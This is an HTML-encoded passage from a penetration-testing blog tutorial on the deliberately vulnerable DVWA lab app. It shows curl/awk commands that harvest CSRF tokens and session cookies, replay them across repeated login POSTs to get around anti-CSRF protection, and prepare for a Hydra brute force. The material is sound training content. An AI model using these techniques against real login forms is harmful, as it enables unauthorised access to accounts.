&lt;p&gt;So let's request a new page, which will generate a fresh &lt;code&gt;PHPSESSID&lt;/code&gt;. This time, when we try to login, we pass this value back in the request.&lt;/p&gt;

&lt;p&gt;Rather than having to mess about manually copying/pasting this value every time, let's make a quick "one liner" and assign the value to a variable. The first command will create a cookie (for &lt;code&gt;PHPSESSID&lt;/code&gt;), and, by using &lt;code&gt;awk&lt;/code&gt;, select the line in the response HTML code that contains the field value for &lt;code&gt;user_token&lt;/code&gt; and extract its (MD5) value. This way, we will have both a valid and related &lt;code&gt;PHPSESSID&lt;/code&gt; &amp;amp; &lt;code&gt;user_token&lt;/code&gt; value. &lt;em&gt;Note: can use either &lt;code&gt;cut -d "'" -f2&lt;/code&gt; or &lt;code&gt;awk -F "'" '{print $2}'&lt;/code&gt;, but &lt;code&gt;cut&lt;/code&gt; will offer a (very slight) performance increase - milliseconds saved!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Also note, throughout the posting, I will keep re-running the &lt;code&gt;CSRF=&lt;/code&gt; command. This is un-needed and a bit "overkill", however, if your session value "times out" the stage will ALWAYS fail. After I had a break and came back to it, I did make this mistake a few times. Plus, it allows for easy copy/paste at any section if you wish to jump/skip to places ;-).&lt;/p&gt;

&lt;p&gt;Finally, compare the response with the baseline ("bash fu" alert, &lt;code&gt;!diff&lt;/code&gt; will re-run the last command that started with &lt;code&gt;diff&lt;/code&gt;. ZSH shells will auto expand the command too ;-)).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -L -b dvwa.cookie -d &amp;quot;username=user&amp;amp;password=pass&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php &amp;gt; /root/after.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# !diff   #diff /root/before.txt /root/after.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;0a1,11
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Found
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:58:45 GMT
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Server: Apache/2.4.10 &lt;span class="o"&gt;(&lt;/span&gt;Win32&lt;span class="o"&gt;)&lt;/span&gt; OpenSSL/1.0.1h PHP/5.4.31
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; X-Powered-By: PHP/5.4.31
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Expires: Thu, &lt;span class="m"&gt;19&lt;/span&gt; Nov &lt;span class="m"&gt;1981&lt;/span&gt; 08:52:00 GMT
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Cache-Control: no-store, no-cache, must-revalidate, post-check&lt;span class="o"&gt;=&lt;/span&gt;0, pre-check&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Pragma: no-cache
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Location: login.php
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 0
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Type: text/html
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;2c13
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:57:20 GMT
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:58:46 GMT
&lt;/span&gt;&lt;span class="line"&gt;5d15
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0pjgscf6jcektumgsegqk8gnf6&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/
&lt;/span&gt;&lt;span class="line"&gt;9,11c19
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0pjgscf6jcektumgsegqk8gnf6&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Set-Cookie: &lt;span class="nv"&gt;security&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;impossible&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Content-Length: 1568
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 1607
&lt;/span&gt;&lt;span class="line"&gt;60c68
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'4bdcf7426fc9438c751ef8d3c7113f2e'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'3eae6f4ceeabfb56e5e390f30bb0195b'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;66c74
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;  &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;Login failed&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Differentiating Responses" src="https://blog.g0tmi1k.com/images/dvwa-login-06.png" /&gt;&lt;/p&gt;

&lt;p&gt;The key bit of information here, is right at the end &lt;code&gt;&amp;lt;div class="message"&amp;gt;Login failed&amp;lt;/div&amp;gt;&lt;/code&gt;. We can see our login method was correct, but the values were not successful ;-).&lt;/p&gt;

&lt;p&gt;Another thing is &lt;code&gt;Location: login.php&lt;/code&gt;. Looks like we are being redirected back to the same page. So far we know this happens when there was a failed login.&lt;/p&gt;

&lt;p&gt;Both things (the failed message and the redirected page) might be a way to signal/distinguish if it was success/failed login. &lt;code&gt;Content-Length&lt;/code&gt; (aka page size) might be another idea, but should be used as a last resort.&lt;/p&gt;

&lt;p&gt;However, let's keep poking about, before trying to brute force.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Login.Form..Re-using.CSRF.Tokens."&gt;&lt;/a&gt;
&lt;h3&gt;Login Form (Re-using CSRF Tokens)&lt;/h3&gt;

&lt;p&gt;So what happens if we make a duplicate request, repeating the exact same command as last time, and compare the response?&lt;/p&gt;

&lt;p&gt;...We will need to use another file (&lt;code&gt;/root/after.txt&lt;/code&gt;) as the baseline, and then we will be comparing two requests which contained a login attempt.&lt;/p&gt;

&lt;p&gt;"Bash fu" alert, we can repeat, using the last cURL command, and replace a value with another one by doing: &lt;code&gt;!curl:gs/after/again/&lt;/code&gt; (ZSH shells will also fill this in before executing it).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# !curl:gs/after/again/   #curl -s -i -L -b dvwa.cookie -d &amp;quot;username=user&amp;amp;password=pass&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php &amp;gt; /root/again.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff after.txt again.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;2c2
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:58:45 GMT
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:59:59 GMT
&lt;/span&gt;&lt;span class="line"&gt;13c13
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:58:46 GMT
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:59:59 GMT
&lt;/span&gt;&lt;span class="line"&gt;19c19
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Content-Length: 1607
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 1618
&lt;/span&gt;&lt;span class="line"&gt;68c68
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'3eae6f4ceeabfb56e5e390f30bb0195b'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'e9ff39f78d2418ce893e93e4066eabc0'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;74c74
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;  &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;Login failed&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;  &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;CSRF token is incorrect&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Re-using CSRF Tokens" src="https://blog.g0tmi1k.com/images/dvwa-login-07.png" /&gt;&lt;/p&gt;

&lt;p&gt;So as expected, repeatedly using the values causes a new error &lt;code&gt;&amp;lt;div class="message"&amp;gt;CSRF token is incorrect&amp;lt;/div&amp;gt;&lt;/code&gt;. This means the anti-CSRF is working as it was designed to.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;However&lt;/strong&gt;... what if we did not follow the redirect (remove &lt;code&gt;curl -L&lt;/code&gt;)?&lt;/p&gt;

&lt;p&gt;What would happen if we generated a new &lt;code&gt;PHPSESSID&lt;/code&gt; &amp;amp; &lt;code&gt;user_token&lt;/code&gt; (just like last time), to make a new valid session, but this time stop at the redirect and make another login request, repeating the &lt;code&gt;PHPSESSID&lt;/code&gt; &amp;amp; &lt;code&gt;user_token&lt;/code&gt; values. And just for good measure, make a 3rd login attempt, again with same &lt;code&gt;PHPSESSID&lt;/code&gt; &amp;amp; &lt;code&gt;user_token&lt;/code&gt; values.&lt;/p&gt;

&lt;p&gt;This means we would only be sending out three POST requests, rather than what would be a POST followed by a GET, three times (total of 6 requests). The POST is the data from the form (username/password being sent). The GET request is product of following the redirect.&lt;/p&gt;

&lt;p&gt;We need to use the same file as before for the baseline, as we are still comparing responses. We will only check the last response (as that is the only one we are interested in for the time being).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -b dvwa.cookie -d &amp;quot;username=user&amp;amp;password=pass&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php &amp;gt; /root/try1.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -b dvwa.cookie -d &amp;quot;username=user&amp;amp;password=123&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php &amp;gt; /root/try2.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -b dvwa.cookie -d &amp;quot;username=user&amp;amp;password=abcdefg&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php -L &amp;gt; /root/try3.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff /root/after.txt /root/try3.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;2c2
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:58:45 GMT
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 20:01:17 GMT
&lt;/span&gt;&lt;span class="line"&gt;13c13
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:58:46 GMT
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 20:01:17 GMT
&lt;/span&gt;&lt;span class="line"&gt;19c19
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Content-Length: 1607
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 1685
&lt;/span&gt;&lt;span class="line"&gt;68c68
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'3eae6f4ceeabfb56e5e390f30bb0195b'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'b47a6ad2207d05dbd9ddc2478074a776'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;74c74
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;  &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;Login failed&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;  &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;Login failed&amp;lt;/div&amp;gt;&amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;Login failed&amp;lt;/div&amp;gt;&amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;Login failed&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Anti CSRF tokens incorrectly implement" src="https://blog.g0tmi1k.com/images/dvwa-login-08.png" /&gt;&lt;/p&gt;

&lt;p&gt;Now that was &lt;strong&gt;not expected&lt;/strong&gt;! There were &lt;strong&gt;three "Login failed"&lt;/strong&gt; messages to our &lt;strong&gt;three login attempts&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;This means we can send as many POST requests as we wish, using the same SESSION ID &amp;amp; CSRF token (on the condition of not following the redirects)!&lt;/p&gt;

&lt;p&gt;It appears sending a GET request to follow the redirect, will generate a new CSRF token.&lt;/p&gt;

&lt;p&gt;The down side to this is we &lt;strong&gt;cannot use the message&lt;/strong&gt; &lt;code&gt;&amp;lt;div class="message"&amp;gt;Login failed&amp;lt;/div&amp;gt;&lt;/code&gt; as a marker for an invalid login - as this is only valid with a GET request (due to the redirect). It also rules out, &lt;code&gt;Content-Length&lt;/code&gt;, as this will always be &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This leaves &lt;code&gt;Location: login.php&lt;/code&gt;. We do not know what a valid login looks like (nothing to compare it to). So let's make a guess, of it redirecting us to a different page other than &lt;code&gt;login.php&lt;/code&gt; (there are not many reasons for seeing the same page again if you are logged in - Two factor authentication?). An educated guess would be &lt;code&gt;index.php&lt;/code&gt;, &lt;code&gt;logged-in.php&lt;/code&gt;, &lt;code&gt;my_account.php&lt;/code&gt; or &lt;code&gt;offers.php&lt;/code&gt;. Either way, let's rule out &lt;code&gt;login.php&lt;/code&gt; for the time being. &lt;em&gt;Note, we will come back to this later on, and, why this should not be a big issue.&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Brute.Force..Testing."&gt;&lt;/a&gt;
&lt;h2&gt;Brute Force (Testing)&lt;/h2&gt;

&lt;a name="Hydra..Documentation."&gt;&lt;/a&gt;
&lt;h3&gt;Hydra (Documentation)&lt;/h3&gt;

&lt;p&gt;Let's read up, what does what, and think about what we need from Hydra. Using a few commands can go a long way...&lt;/p&gt;

